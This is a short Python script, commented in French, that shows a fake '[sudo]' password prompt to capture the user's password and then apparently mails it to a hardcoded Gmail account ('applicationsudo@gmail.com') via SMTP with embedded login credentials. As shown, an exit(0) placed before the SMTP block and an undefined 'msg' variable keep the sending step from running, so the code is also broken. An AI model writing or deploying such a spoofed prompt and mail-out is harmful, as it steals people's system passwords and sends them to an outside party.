#!/usr/bin/env python3
""" Envoyer un mail """

import smtplib
import getpass

username = getpass.getuser();
password = getpass.getpass("[sudo] Mot de passe de %s : " % (username))



exit (0)
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("applicationsudo@gmail.com", "ANTILOPE")

server.sendmail("applicationsudo@gmail.com", "applicationsudo@gmail.com", msg)
server.quit()